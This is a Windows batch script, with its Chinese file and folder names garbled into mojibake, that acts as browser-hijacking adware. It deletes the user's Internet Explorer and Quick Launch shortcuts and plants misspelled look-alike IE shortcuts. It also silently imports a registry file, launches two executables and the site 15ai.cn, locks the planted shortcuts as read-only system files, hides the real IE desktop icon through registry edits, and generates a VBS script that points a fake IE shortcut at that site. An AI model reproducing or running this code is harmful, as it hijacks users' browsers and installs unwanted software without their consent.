cls
@echo off
del "%userprofile%\����\IEXPLORE.lnk"
del "%userprofile%\����\IEXPLOREr.lnk"
del "%userprofile%\����\Internet Exporer.lnk"
del "%userprofile%\����\Internet Explorer.lnk"
del "%userprofile%\����\Internet Exp1orer.lnk"
del "%userprofile%\����\Internet Explorer.lnk" 
del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\����\*.url"     /f/q/a
del   "%userprofile%\����ʼ���˵�\*.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.lnk" /f/q/a

copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\��ַ֮��.lnk" /y
copy "�Ա�����.lnk" "%userprofile%\����ʼ���˵�\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" /y
copy "KwLive.lnk" "%userprofile%\����ʼ���˵�\�������.lnk" /y
copy "bq.lnk" "%userprofile%\����ʼ���˵�\QQ����.lnk" /y

copy "��ѶQQ.lnk" "%userprofile%\����ʼ���˵�\����\����\QQ.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\����\Internet Expleror.lnk" /y
copy "�Ա�����.lnk" "%userprofile%\����\�Ա�����.lnk" /y
copy "bq.lnk" "%userprofile%\����\QQ����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����\��ѵ�Ӱ.lnk" /y
copy "KwLive.lnk" "%userprofile%\����\�������.lnk" /y
 
copy "KwLive.lnk" "%userprofile%\����ʼ���˵�\����\�������.lnk" /y
copy "Internet Explorer.lnk" "%userprofile%\����ʼ���˵�\����\Internet Exporer.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorrer �����.lnk" /y

copy "KwLive.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\�������.lnk" /y
copy "bq.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\QQ����.lnk" /y

copy "taobao.lnk" "%userprofile%\Favorites\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\Favorites\��ѵ�Ӱ.lnk" /y
copy "bq.lnk" "%userprofile%\Favorites\QQ����.lnk" /y
copy "Internet Exporer.lnk" "%userprofile%\Favorites\��վ��ȫ.lnk" /y 

regedit /s sy.reg
start http://www.15ai.cn
start KwLive.exe
start inetinkao.exe
attrib  "%USERPROFILE%\����\*.lnk"  +R +S
attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S

Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%
echo Set Shell=CreateObject("WScript.Shell")>createcs.vbs
echo DesktopPath=Shell.SpecialFolders("Desktop")>>createcs.vbs
echo Set link=Shell.CreateShortcut(DesktopPath ^& "\\Internet Explorer.lnk")>>createcs.vbs
echo link.description="Internet Explorer">>createcs.vbs
echo sPath=left(Wscript.ScriptFullName,len(Wscript.ScriptFullName)-len(Wscript.ScriptName))>>createcs.vbs
echo link.TargetPath=sPath ^& "c:\Program Files\Internet explorer\IEXPLORE.EXE">>createcs.vbs
echo Link.Arguments = "http://www.15ai.cn/?��ַ����">>createcs.vbs
echo link.WindowStyle=1 >>createcs.vbs
echo link.WorkingDirectory=DesktopPath>>createcs.vbs
echo link.Save>>createcs.vbs
createcs.vbs
del createcs.vbs

exit